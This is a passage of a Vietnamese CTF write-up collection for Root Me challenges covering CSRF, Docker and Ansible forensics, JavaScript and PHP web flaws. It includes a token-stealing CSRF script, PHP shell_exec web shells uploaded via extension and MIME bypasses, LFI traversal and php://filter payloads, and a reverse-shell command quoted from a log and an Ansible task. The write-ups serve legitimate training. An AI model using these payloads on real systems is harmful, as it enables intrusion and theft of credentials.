+
+&lt;script&gt;
+
+var req = new XMLHttpRequest();
+
+req.open("GET", decodeURIComponent("http://challenge01.root-me.org/web-client/ch23/?action=profile"), false);
+
+req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+req.send();
+
+var token = req.responseText.match(/\[abcdef0123456789\]{32}/);
+
+document.getElementById("token").value = token;
+
+document.getElementById("clickme").submit();
+
+&lt;/script&gt;
+</code></pre>
+<p><img src="CSRF/CSRFtokenbypass/./media/image3.png" alt="" /></p>
+<p>Submit để gửi contact đến admin và qua tab Private để kiểm tra kết quả. Sau hơn 1 phút, ta nhận được flag:</p>
+<p><img src="CSRF/CSRFtokenbypass/./media/image4.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="forensics-challenges"><a class="header" href="#forensics-challenges">Forensics Challenges</a></h1>
+<p>Write-ups for Root Me Forensics challenges, focusing on digital investigation, data recovery, and analysis techniques.</p>
+<div class="table-wrapper"><table><thead><tr><th>Challenge Name</th><th>Write-up Link</th></tr></thead><tbody>
+<tr><td>Docker layer</td><td><a href="Forensics/./Docker-layer/Docker-layer.html">Read more</a></td></tr>
+<tr><td>Open My Vault</td><td><a href="Forensics/./Open-My-Vault/Open-My-Vault.html">Read more</a></td></tr>
+</tbody></table>
+</div>
+<blockquote>
+<p>💡 Each folder contains step-by-step solutions, screenshots, and tools used.</p>
+</blockquote>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="docker-layers"><a class="header" href="#docker-layers"><a href="https://www.root-me.org/fr/Challenges/Forensic/Docker-layers">Docker layers</a></a></h1>
+<p>Sử dụng <code>container-diff</code> để analyze history của file <code>.tar</code></p>
+<pre><code class="language-bash">container-diff analyze -t history ch29.tar
+
+-----History-----
+
+Analysis for ch29.tar:
+-/bin/sh -c #(nop) ADD file:d2abf27fe2e8b0b5f4da68c018560c73e11c53098329246e3e6fe176698ef941 in /
+-/bin/sh -c #(nop)  CMD ["bash"]
+-/bin/sh -c apt update -y
+-/bin/sh -c apt install -y curl openssl
+-/bin/sh -c #(nop) COPY file:2ca89eb39686ffcc3d2d87bbc9293559252cff471f80c2ed5d024b214f9a6fa3 in /
+-/bin/sh -c echo -n $(curl -s https://pastebin.com/raw/P9Nkw866) | openssl enc -aes-256-cbc -iter 10 -pass pass:$(cat /pass.txt) -out flag.enc
+-/bin/sh -c rm /pass.tx
+</code></pre>
+<p>Ta thấy, tác giả sử dụng encrypt file flag lấy từ https://pastebin.com/raw/P9Nkw866 (not found) và encrypt với password được mount tại /pass.txt từ một file local.</p>
+<p>Giờ thì untar file <code>ch29.tar</code> ra và tìm kiếm flag:</p>
+<pre><code class="language-bash"> 1bbd61a572ad5f5e2ac0f073465d10dc1c94a71359b0adfd2c105be4c1cb2507
+ 316bbb8c58be42c73eefeb8fc0fdc6abb99bf3d5686dd5145fc7bb2f32790229.tar
+ 3309d6da2bd696689a815f55f18db3f173bc9b9a180e5616faf4927436cf199d.tar
+ 4942a1abcbfa1c325b1d7ed93d3cf6020f555be706672308a4a4a6b6d631d2e7.tar
+ 5bcc45940862d5b93517a60629b05c844df751c9187a293d982047f01615cb30
+ 743c70a5f809c27d5c396f7ece611bc2d7c85186f9fdeb68f70986ec6e4d165f.tar
+ 82ba49da0bd5d767f35d4ae9507d6c4552f74e10f29777a2a27c97778962476d
+ 8d364403e7bf70d7f57e807803892edf7304760352a397983ecccb3e76ca39fa.tar
+ 8f0d75885373613641edc42db2a0007684a0e5de14c6f854e365c61f292f3b4d
+ b324f85f8104bfebd1ed873e90437c0235d7a43f025a047d5695fe461da717c6.json
+ b58c5e8ccaba8886661ddd3b315989f5cf7839ea06bbe36547c6f49993b0d0aa.tar
+ ca7f60c6e2a66972abcc3147da47397d1c2edb80bddf0db8ef94770ed28c5e16
+ db04fe239ab708e4ab56ea0e5c1047449b7ea9e04df9db5b1b95d00c6980ff3f
+ flag.enc
+ manifest.json
+ openssl
+ repositories
+</code></pre>
+<p>Unzip tiếp các file <code>.tar</code> còn lại sẽ xuất hiện file <code>flag.enc</code> và <code>pass.txt</code>:</p>
+<pre><code class="language-bash">cat pass.txt
+d4428185a6202a1c5806d7cf4a0bb738a05c03573316fe18ba4eb5a21a1bc8ea
+</code></pre>
+<pre><code class="language-bash">cat flag.enc
+Salted__s`;?�d�q���/�!����$@�����8�=NK:�E�n%���.N��02)�d
+</code></pre>
+<p>Sử dụng <code>openssl</code> để descrypt <code>flag.enc</code>:</p>
+<pre><code class="language-bash">openssl enc -aes-256-cbc -iter 10 -d -in flag.enc -out flag.txt
+</code></pre>
+<p>Và nhận flag: <code>cat flag.txt *******************</code></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="open-my-vault"><a class="header" href="#open-my-vault">O<a href="https://www.root-me.org/en/Challenges/Forensic/Open-My-Vault">pen My Vault</a></a></h1>
+<p>Sau khi ssh vào server, ta kiểm tra history của user:</p>
+<pre><code class="language-bash">    1  id
+    2  cat /etc/passwd
+    3  pwd
+    4  cd /home/m4st3r/
+    5  ping 128.66.0.0
+    6  cat /etc/shadow
+    7  l
+    8  ll
+    9  cd ansible/
+   10  ls -lah
+   11  tree .
+   12  cat inventory.cfg
+   13  cat playbook.yml
+   14  cat roles/zip/tasks/main.yml
+   15  mkdir roles/other
+   16  mkdir roles/other/tasks
+   17  ansible-vault -h
+   18  ansible-vault create roles/other/tasks/main.yml
+   19  vim playbook.yml
+   20  ansible-playbook -h
+   21  ansible-playbook -i inventory.cfg --vault-password-file=/tmp/.secure playbook.yml
+   22  rm /tmp/.secure
+</code></pre>
+<p>Ở dòng 21, m4st3r đã chạy một playbook đã mã hóa với password nằm ở <code>/tmp/.secure</code> và sau đó anh ấy đã xóa nó với <code>rm /tmp/.secure</code></p>
+<p>Thử chạy lại dòng 21, kết quả trả về là không thể vì thiếu ssh-key</p>
+<p>Giờ thì check thử <code>/var/log</code> ta có:</p>
+<pre><code class="language-bash">ll /var/log/
+total 712
+drwxr-xr-x 1 root root              4096 Dec  4 11:53 ./
+drwxr-xr-x 1 root root              4096 Dec  4 11:53 ../
+-rw-r--r-- 1 root root             13764 Dec  4 11:56 alternatives.log
+drwxr-xr-x 1 root adm               4096 Dec  4 12:05 apache2/
+drwxr-xr-x 1 root root              4096 Dec  4 11:53 apt/
+-rw-r--r-- 1 root root             58592 Sep 22 16:47 bootstrap.log
+-rw-rw---- 1 root utmp                 0 Sep 22 16:47 btmp
+-rw-r--r-- 1 root root            284658 Dec  4 11:56 dpkg.log
+-rw-r--r-- 1 root root             32032 Dec  4 12:05 faillog
+drwxr-sr-x 2 root systemd-journal   4096 Dec  4 11:53 journal/
+-rw-rw-r-- 1 root utmp            292292 Dec 11 08:17 lastlog
+drwx------ 2 root root              4096 Dec  4 11:53 private/
+-rw-rw-r-- 1 root utmp               384 Dec 11 08:17 wtmp
+</code></pre>
+<p>Okay, giờ thì check log theo thứ tự ưu tiên là syslog -&gt; weblog. Đúng là anh ấy đã quên xóa log. Ở <code>/var/log/apache2/access.log</code> ta tìm được thứ này:</p>
+<pre><code class="language-bash">203.0.113.0 - - [03/Sep/2022:13:34:31 +0200] "GET /pdf.php?name=a.pdf;echo%20%22C4tXk9ctpG9QEMeL%22%20%3E%20/tmp/.secure HTTP/1.1" 200 31 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
+203.0.113.0 - - [03/Sep/2022:13:34:57 +0200] "GET /pdf.php?name=a.pdf;bash%20-i%20%3E&amp;%20/dev/tcp/128.66.0.0/4444%200%3E&amp;1 HTTP/1.1" 200 31 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
+</code></pre>
+<p>Thứ này giống như website đã bị chèn shell. Decode với URL decode ta được:</p>
+<pre><code class="language-bash">echo "C4tXk9ctpG9QEMeL" &gt; /tmp/.secure
+bash -i &gt;&amp; /dev/tcp/128.66.0.0/4444 0&gt;&amp;1
+</code></pre>
+<p>Vậy là ta đã tìm được <code>.secure</code> password của vault. Giờ thì decrypt nó :</p>
+<pre><code class="language-bash">echo "C4tXk9ctpG9QEMeL" &gt; /tmp/.secure
+ansible-vault decrypt --vault-pass-file /tmp/.secure roles/other/tasks/main.yml
+Decryption successful
+...
+cat roles/other/tasks/main.yml
+- name: "hack the planet"
+  ansible.builtin.shell: "bash -i &gt;&amp; /dev/tcp/128.66.0.0/4444 0&gt;&amp;1"
+
+- name: "If someone search for a Flag ^^"
+  ansible.builtin.shell: "echo '************' &gt; /flag"
+</code></pre>
+<p>^^</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="javascript-challenges"><a class="header" href="#javascript-challenges">Javascript Challenges</a></h1>
+<p>Root Me challenges focused on Javascript logic, obfuscation, and source code analysis.</p>
+<div class="table-wrapper"><table><thead><tr><th>Challenge Name</th><th>Write-up Link</th></tr></thead><tbody>
+<tr><td>HTML - disabled buttons</td><td><a href="Javascript/./HTML-disabledbuttons/HTML-disabledbuttons.html">Read more</a></td></tr>
+<tr><td>Javascript - Authentication</td><td><a href="Javascript/./Javascript-Authentication/Javascript-Authentication.html">Read more</a></td></tr>
+<tr><td>Javascript - Authentication 2</td><td><a href="Javascript/./Javascript-Authentication2/Javascript-Authentication2.html">Read more</a></td></tr>
+<tr><td>Javascript - Native code</td><td><a href="Javascript/./Javascript-Nativecode/Javascript-Nativecode.html">Read more</a></td></tr>
+<tr><td>Javascript - Obfuscation 1</td><td><a href="Javascript/./Javascript-Obfuscation1/Javascript-Obfuscation1.html">Read more</a></td></tr>
+<tr><td>Javascript - Obfuscation 2</td><td><a href="Javascript/./Javascript-Obfuscation2/Javascript-Obfuscation2.html">Read more</a></td></tr>
+<tr><td>Javascript - Obfuscation 3</td><td><a href="Javascript/./Javascript-Obfuscation3/Javascript-Obfuscation3.html">Read more</a></td></tr>
+<tr><td>Javascript - Source</td><td><a href="Javascript/./Javascript-Source/Javascript-Source.html">Read more</a></td></tr>
+</tbody></table>
+</div>
+<blockquote>
+<p>💡 See each folder for code, explanations, and screenshots.</p>
+</blockquote>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="javascript---authentication"><a class="header" href="#javascript---authentication"><a href="https://www.root-me.org/en/Challenges/Web-Client/Javascript-Authentication">Javascript - Authentication</a></a></h1>
+<p>Kiểm tra website, ta thấy ở phần Elements không có gì khác biệt:</p>
+<p><img src="Javascript/Javascript-Authentication/./media/image1.png" alt="" /></p>
+<p>Chuyển qua phần Sources, ta có thể thấy được file login.js với nội dung:</p>
+<p><img src="Javascript/Javascript-Authentication/./media/image2.png" alt="" /></p>
+<p>Có nghĩa, khi nhập đúng <strong>pseudo=="4dm1n" &amp;&amp; password=="sh.org"</strong> thì sẽ nhận được alert thành công (cũng không có gì khác biệt). Do đó, ta thử nhập password (flag) với giá trị là <strong>sh.org</strong> thì thấy đã tìm được đúng password.</p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="javascript---authentication-2"><a class="header" href="#javascript---authentication-2"><a href="https://www.root-me.org/en/Challenges/Web-Client/Javascript-Authentication-2">Javascript - Authentication 2</a></a></h1>
+<p>Vào website, ta thấy có một nút login và một thẻ &lt;a&gt; để đóng của sổ:</p>
+<p><img src="Javascript/Javascript-Authentication2/./media/image1.png" alt="" /></p>
+<p>Click vào login button, website sẽ hiện 2 ô alert lần lượt là <code>username</code> và <code>password</code>. Kiểm tra Sources website, ta thấy có file <code>login.js</code>:</p>
+<p><img src="Javascript/Javascript-Authentication2/./media/image2.png" alt="" /></p>
+<p>Ta thấy, script so sánh <code>username == TheUsername &amp;&amp; password == ThePassword</code>. Trong khi đó <code>TheUsername</code> và ThePassword lần lượt là <code>TheSplit[0]</code> và <code>TheSplit[1]</code>. Từ đó với <code>var TheLists = ["GOD:HIDDEN"]</code>, ta có thể suy ra:</p>
+<pre><code class="language-yaml">Username: GOD
+Password: HIDDEN
+</code></pre>
+<p><img src="Javascript/Javascript-Authentication2/./media/image3.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="javascript---native-code"><a class="header" href="#javascript---native-code"><a href="https://www.root-me.org/en/Challenges/Web-Client/Javascript-Native-code">Javascript - Native code</a></a></h1>
+<p>Kiểm tra Sources website, ta thấy có file ch16.html:</p>
+<p><img src="Javascript/Javascript-Nativecode/./media/image1.png" alt="" /></p>
+<p>Sử dụng công cụ <a href="https://www.dcode.fr/javascript-unobfuscator">Javascript Unobfuscator</a> để decrypt đoạn mã trên, ta được:</p>
+<p><img src="Javascript/Javascript-Nativecode/./media/image2.png" alt="" /></p>
+<p>Từ đó, dễ dàng suy đoán được, <code>password = "****************************"</code></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="javascript---obfuscation-2"><a class="header" href="#javascript---obfuscation-2"><a href="https://www.root-me.org/en/Challenges/Web-Client/Javascript-Obfuscation-2">Javascript - Obfuscation 2</a></a></h1>
+<p>Kiểm tra Sources website, ta thấy có file ch12.html:</p>
+<p><img src="Javascript/Javascript-Obfuscation1/./media/image1.png" alt="" /></p>
+<p>Ta thấy, pass lúc này được gán bằng một dòng lệnh Javascript. Lúc này, ta sẽ thử qua Console và chạy các lệnh này:</p>
+<p><img src="Javascript/Javascript-Obfuscation1/./media/image2.png" alt="" /></p>
+<p>Lúc này, có vẻ như ta đã tìm được password.</p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="javascript---obfuscation-1"><a class="header" href="#javascript---obfuscation-1"><a href="https://www.root-me.org/en/Challenges/Web-Client/Javascript-Obfuscation-1">Javascript - Obfuscation 1</a></a></h1>
+<p>Vào website, website yêu cầu nhập password:</p>
+<p><img src="Javascript/Javascript-Obfuscation2/./media/image1.png" alt="" /></p>
+<p>Kiểm tra Sources website, ta thấy có file <code>ch4.html</code>:</p>
+<p><img src="Javascript/Javascript-Obfuscation2/./media/image2.png" alt="" /></p>
+<p>Ta thấy: <code>pass ='%63%70%61%73%62%69%65%6e%64%75%72%70%61%73%73%77%6f%72%64'</code></p>
+<p>Đây là chuỗi hex, ta convert sang ASCII Text và có được password:</p>
+<p><img src="Javascript/Javascript-Obfuscation2/./media/image3.png" alt="" /></p>
+<p><img src="Javascript/Javascript-Obfuscation2/./media/image4.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="javascript---obfuscation-3"><a class="header" href="#javascript---obfuscation-3"><a href="https://www.root-me.org/en/Challenges/Web-Client/Javascript-Obfuscation-3">Javascript - Obfuscation 3</a></a></h1>
+<p>Kiểm tra Sources website, ta thấy có file <code>ch13.html</code>:</p>
+<p><img src="Javascript/Javascript-Obfuscation3/./media/image1.png" alt="" /></p>
+<p>Decode chuỗi ở biến pass, ta nhận được kết quả <code>FAUX PASSWORD HAHA</code>. Đọc lại code, ta thấy, ở dòng 21, script có sử dụng hàm <code>dechiffre()</code> để decode một đoạn chuỗi giá trị loại hex. Ta sử dụng công cụ ASCII Code để decrypt nó và được:</p>
+<p><img src="Javascript/Javascript-Obfuscation3/./media/image2.png" alt="" /></p>
+<p>Ta nhận được chuỗi <code>“55,56,54,79,115,69,114,116,107,49,50”</code>. Chuỗi này có format giống chuỗi ở biến pass, ta decode nó một lần nữa với công cụ ASCII Code và được:</p>
+<p><img src="Javascript/Javascript-Obfuscation3/./media/image3.png" alt="" /></p>
+<p>Từ đó, ta suy đoán được, <code>password = '****************'</code></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="javascript---source"><a class="header" href="#javascript---source"><a href="https://www.root-me.org/en/Challenges/Web-Client/Javascript-Source">Javascript - Source</a></a></h1>
+<p>Vào website, ta thấy có một ô alert hiện ra bắt ta nhập mật khẩu:</p>
+<p><img src="Javascript/Javascript-Source/./media/image1.png" alt="" /></p>
+<p>Kiểm tra Sources của website, ta thấy một file (index):</p>
+<p><img src="Javascript/Javascript-Source/./media/image2.png" alt="" /></p>
+<p>Đến đây, ta có thể thấy, body sẽ sử dụng event onload để chạy hàm <code>login()</code>, hàm <code>login()</code> sẽ so sánh password với chuỗi <code>"123456azerty"</code>, do đó, ta sẽ sử dụng chuỗi này để nhập vào ô alert ban đầu cũng như vào password của challenge.</p>
+<p><img src="Javascript/Javascript-Source/./media/image3.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="php-challenges"><a class="header" href="#php-challenges">PHP Challenges</a></h1>
+<p>Write-ups for Root Me PHP security challenges. Each guide explains the vulnerability, exploitation steps, and key takeaways for educational purposes.</p>
+<div class="table-wrapper"><table><thead><tr><th>Challenge Name</th><th>Write-up Link</th></tr></thead><tbody>
+<tr><td>Directory Traversal</td><td><a href="PHP/./DirectoryTraversal/DirectoryTraversal.html">Read more</a></td></tr>
+<tr><td>File upload - Double extensions</td><td><a href="PHP/./Fileupload-Doubleextensions/Fileupload-Doubleextensions.html">Read more</a></td></tr>
+<tr><td>File upload - MIME type</td><td><a href="PHP/./Fileupload-MIMEtype/Fileupload-MIMEtype.html">Read more</a></td></tr>
+<tr><td>HTTP - Directory indexing</td><td><a href="PHP/./HTTP-Directoryindexing/HTTP-Directoryindexing.html">Read more</a></td></tr>
+<tr><td>Local File Inclusion</td><td><a href="PHP/./LocalFileInclusion/LocalFileInclusion.html">Read more</a></td></tr>
+<tr><td>Local File Inclusion - Double Encoding</td><td><a href="PHP/./LocalFileInclusion-DoubleEncoding/LocalFileInclusion-DoubleEncoding.html">Read more</a></td></tr>
+<tr><td>Local File Inclusion - Wrappers</td><td><a href="PHP/./LocalFileInclusion-Wrappers/LocalFileInclusion-Wrappers.html">Read more</a></td></tr>
+<tr><td>PHP - assert()</td><td><a href="PHP/./PHP-assert()/PHP-assert().html">Read more</a></td></tr>
+<tr><td>PHP - Filters</td><td><a href="PHP/./PHP-Filters/PHP-Filters.html">Read more</a></td></tr>
+<tr><td>PHP - register global</td><td><a href="PHP/./PHP-registerglobal/PHP-registerglobal.html">Read more</a></td></tr>
+<tr><td>Remote File Inclusion</td><td><a href="PHP/./RemoteFileInclusion/RemoteFileInclusion.html">Read more</a></td></tr>
+</tbody></table>
+</div>
+<blockquote>
+<p>💡 Explore each folder for detailed explanations and screenshots.</p>
+</blockquote>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="directory-traversal"><a class="header" href="#directory-traversal"><a href="https://www.root-me.org/en/Challenges/Web-Server/Directory-traversal">Directory Traversal</a></a></h1>
+<p><img src="PHP/DirectoryTraversal/./media/image1.png" alt="" /></p>
+<p>Thử tìm các hình ảnh ở các tab, không phát hiện điều gì khác biệt. Chú ý đến <strong>URL</strong> <a href="http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=emotes">http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=emotes</a> có <em>galerie=[value].</em> Ta thử xóa đi value để website trả về dạng ‘index’:</p>
+<p><img src="PHP/DirectoryTraversal/./media/image2.png" alt="" /></p>
+<p>Lúc này, website trả về một <strong>alt=“86hwnX2r”.</strong> Chọn <strong>“Open image in new window”</strong> thì nhận được <code>403 Forbidden</code>:</p>
+<p><img src="PHP/DirectoryTraversal/./media/image3.png" alt="" /></p>
+<p>Có lẽ galerie lúc này phải là <code>null</code> hoặc bằng value nào đó. Ta back về <code>ch15.php</code> source web và add vào source link của ảnh đó <a href="http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=86hwnX2r">http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=86hwnX2r</a> ta chuyển đến trang khác:</p>
+<p><img src="PHP/DirectoryTraversal/./media/image4.png" alt="" /></p>
+<p>Ảnh password đã xuất hiện, truy cập source password và nhận password <a href="https://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r/password.txt">https://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r/password.txt</a></p>
+<p><img src="PHP/DirectoryTraversal/./media/image5.png" alt="" /></p>
+<p><img src="PHP/DirectoryTraversal/./media/image6.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="file-upload--double-extensions"><a class="header" href="#file-upload--double-extensions"><a href="https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions">File upload – Double extensions</a></a></h1>
+<p>Đầu tiên, ta kiểm tra thử xem password của admin sẽ nằm ở đâu. Thử tìm kiếm tại .passwd file thì nhận được lỗi <code>403 Forbidden</code>. Có file này nhưng bị giới hạn access:</p>
+<p><img src="PHP/Fileupload-Doubleextensions/./media/image1.png" alt="" /></p>
+<p>Tiếp theo, ta sẽ mở cổng upload của server, ta có thể upload các file image (jpeg/png/gif):</p>
+<p><img src="PHP/Fileupload-Doubleextensions/./media/image2.png" alt="" /></p>
+<p>Như vậy, để đọc được <code>.passwd</code>, ta cần phải đi ngược folder 3 lần Vị trí .passwd nằm tại <code>../../../.passwd</code></p>
+<p>Để đọc được <code>.passwd</code>, ta thử sử dụng cổng này để upload file .php lên server và buộc server sử dụng <code>shell_exec()</code> để thực thi shell:</p>
+<pre><code class="language-php">&lt;?php  
+$output = shell_exec('cat ../../../.passwd');  
+echo "&lt;pre&gt;$output&lt;/pre&gt;";  
+?&gt;
+</code></pre>
+<p>Đề bài đã gợi ý cho ta sử dụng Double Extensions, do đó, thử rename file <code>.php</code> --&gt; <code>.php.jpg</code> và upload:</p>
+<p><img src="PHP/Fileupload-Doubleextensions/./media/image3.png" alt="" /></p>
+<p>Upload thành công, truy cập link và nhận password:</p>
+<p><img src="PHP/Fileupload-Doubleextensions/./media/image4.png" alt="" /></p>
+<p><img src="PHP/Fileupload-Doubleextensions/./media/image5.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="file-upload---mime-type"><a class="header" href="#file-upload---mime-type"><a href="https://www.root-me.org/en/Challenges/Web-Server/File-upload-MIME-type">File upload - MIME type</a></a></h1>
+<p>Đề yêu cầu ta tìm .passwd. Thử check với .passwd tại <strong>/ch21/.passwd</strong> thì nhận được 404 Forbidden:</p>
+<p><img src="PHP/Fileupload-MIMEtype/./media/image1.png" alt="" /></p>
+<p>Website có cung cấp một cổng upload và challenge có đề cập đến <strong>MIME type</strong>. ổng này sau khi nhận file của ta thì lưu trữ tại <code>./[name]</code>. Bây giờ ta cần chèn payload vào để push lên server:</p>
+<p><img src="PHP/Fileupload-MIMEtype/./media/image2.png" alt="" /></p>
+<p><img src="PHP/Fileupload-MIMEtype/./media/image3.png" alt="" /></p>
+<p>URL sau khi upload: <a href="http://challenge01.root-me.org/web-serveur/ch21/galerie/upload/40ce7d3f3fe27d0d9c1970598b6d09a8//nh4ttruong.jpg">http://challenge01.root-me.org/web-serveur/ch21/galerie/upload/40ce7d3f3fe27d0d9c1970598b6d09a8//nh4ttruong.jpg</a></p>
+<p>Lúc đầu, ta đã biết .passwd nằm tại …/ch21/.passwd. Do đó, ta cần đi ngược folder 3 lần để đọc được.</p>
+<p>Gắn <a href="https://www.php.net/manual/en/function.mime-content-type.php">shell_exec()</a> vào file <code>nh4ttruong123.php.jpg</code>:</p>
+<pre><code class="language-php">&lt;?php  
+$output = shell_exec('cat ../../../.passwd');  
+echo "&lt;pre&gt;&lt;/pre&gt;$output&lt;/pre&gt;";  
+?&gt;
+``
+
+Bởi vì server chỉ cho ta upload các file image (jpeg/png/gif), do đó, ta cần sử dụng BurpSuite để modify request convert `.jpg` sang `.php`:
+
+![](./media/image4.png)
+
+Mod thành công:
+
+![](./media/image5.png)
+
+Code đã chạy, ta get được password:
+
+![](./media/image6.png)
+
+![](./media/image7.png)
+
+- Flag: "****************************"
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="http---directory-indexing"><a class="header" href="#http---directory-indexing"><a href="https://www.root-me.org/en/Challenges/Web-Server/HTTP-Directory-indexing">HTTP - Directory indexing</a></a></h1>
+<p>Theo gợi ý từ đề bài <strong>CTRL+U</strong>, ta view-source thì nhận được dòng comment:</p>
+<p><img src="PHP/HTTP-Directoryindexing/./media/image1.png" alt="" /></p>
+<p>Truy cập đến <code>admin.pass.html</code> thấy được message rick roll:</p>
+<p><img src="PHP/HTTP-Directoryindexing/./media/image2.png" alt="" /></p>
+<p>Back lại, ta tìm trong folder admin xem có gì:</p>
+<p><img src="PHP/HTTP-Directoryindexing/./media/image3.png" alt="" /></p>
+<p>Mò một lúc thì ta thấy được password nằm tại <code>admin/backup/admin.txt</code> (<a href="http://challenge01.root-me.org/web-serveur/ch4/admin/backup/admin.txt">http://challenge01.root-me.org/web-serveur/ch4/admin/backup/admin.txt</a>)</p>
+<p><img src="PHP/HTTP-Directoryindexing/./media/image4.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="local-file-inclusion"><a class="header" href="#local-file-inclusion"><a href="https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion">Local File Inclusion</a></a></h1>
+<p>Website có rất nhiều tab và gây confuse khi làm:</p>
+<p><img src="PHP/LocalFileInclusion/./media/image1.png" alt="" /></p>
+<p>Câu query URL có dạng <a href="http://challenge01.root-me.org/web-serveur/ch16/?files=crypto&amp;f=index.html">challenge01.root-me.org/web-serveur/ch16/?files=sysadm&amp;f=index.html</a> với files sẽ chỉ định folder và f sẽ chỉ định tệp hoặc folder con mà ta chọn:</p>
+<p><img src="PHP/LocalFileInclusion/./media/image2.png" alt="" /></p>
+<p><img src="PHP/LocalFileInclusion/./media/image3.png" alt="" /></p>
+<p>Chuyển qua mò tab Admin thì website bắt login. Biết gì đâu mà login :v. Tắt promt login thì ta nhận được dòng text:</p>
+<p><img src="PHP/LocalFileInclusion/./media/image4.png" alt="" /></p>
+<p>Như vậy, website sử dụng backend là PHP. Thử mò file source code của nó dựa theo query ở trên:</p>
+<p><img src="PHP/LocalFileInclusion/./media/image5.png" alt="" /></p>
+<p>Lỗi trả về là <code>file_get_contents()</code> không tìm được filename. Sau khi thử fuzz một lúc thì phát hiện ra website không block <code>‘../’.</code> Đã đến lúc ta dùng <strong>Path Traversal</strong>.</p>
+<p>Thử với <code>files=../</code>:</p>
+<p><img src="PHP/LocalFileInclusion/./media/image6.png" alt="" /></p>
+<p>Lúc này, ta thấy được các thư mục cha chứa thư mục files, trong đó, có folder admin. Đặc biệt, website có một file là index.php giống như ở homepage của website. Vậy hướng của ta là xem được các file có trong folder admin (như index.php). Thử trỏ <code>files=../admin</code> và <code>&amp;f=index.php</code> thì ta đã truy cập thành công index.php:</p>
+<p><img src="PHP/LocalFileInclusion/./media/image7.png" alt="" /></p>
+<p>Dò source code ta thấy được 2 dòng code rất giá trị:</p>
+<p><img src="PHP/LocalFileInclusion/./media/image8.png" alt="" /></p>
+<p>Vậy là đã tìm được account của admin:</p>
+<pre><code class="language-yaml">- Username: admin
+- Password: OpbNJ60xYpvAQU8
+</code></pre>
+<p><img src="PHP/LocalFileInclusion/./media/image9.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="local-file-inclusion--double-encoding"><a class="header" href="#local-file-inclusion--double-encoding"><a href="https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding">Local File Inclusion – Double Encoding</a></a></h1>
+<p><img src="PHP/LocalFileInclusion-DoubleEncoding/./media/image1.png" alt="" /></p>
+<p>Fuzz với <strong>Path Traversal</strong>, ta thấy web server block hoặc filter <code>‘../’</code>:</p>
+<p><img src="PHP/LocalFileInclusion-DoubleEncoding/./media/image2.png" alt="" /></p>
+<p>Tên challenge là <strong>LFI – Double Encoding URL Double Encoding</strong>. Ta convert <code>../</code> --&gt; <code>%252E%252E%252F</code> () <code>%252E = .</code> ; <code>%252F = /</code>)</p>
+<p>Đưa vào <code>?page=[value]</code> ta được:</p>
+<p><img src="PHP/LocalFileInclusion-DoubleEncoding/./media/image3.png" alt="" /></p>
+<p>Đến đây, sau khi append bất kỳ text nào thì server sẽ concat <strong>text.inc.php</strong>:</p>
+<p><img src="PHP/LocalFileInclusion-DoubleEncoding/./media/image4.png" alt="" /></p>
+<p>Dạo quanh <strong>index.html</strong> và homepage thì không phát hiện bất kỳ điều gì đặc biệt. Tương tự các bài LFI khác, ta cần get source để xem tác giả đặt gì trong web. Khi xem về cách get source php, ta có payload get như sau:</p>
+<p><code>?page=php://filter/convert.base64-encode/resource=[source_file]</code></p>
+<p>Giờ thì đưa vào payload ta để get source ở <strong>home.inc.php</strong>:</p>
+<p><code>?page=php://filter/convert.base64-encode/resource=home</code></p>
+<p>Double encoding: <code>?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dhome</code></p>
+<p><img src="PHP/LocalFileInclusion-DoubleEncoding/./media/image5.png" alt="" /></p>
+<p>Bỏ vào base64 decode:</p>
+<p><img src="PHP/LocalFileInclusion-DoubleEncoding/./media/image6.png" alt="" /></p>
+<p>View source không tìm được gì đặc biệt. Tuy vậy, website đã sử dụng thư viện từ <strong>conf.inc.php</strong>. Từ đó, tiến hành xem thử <strong>conf.inc.php</strong>:</p>
+<p><code>?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dconf</code></p>
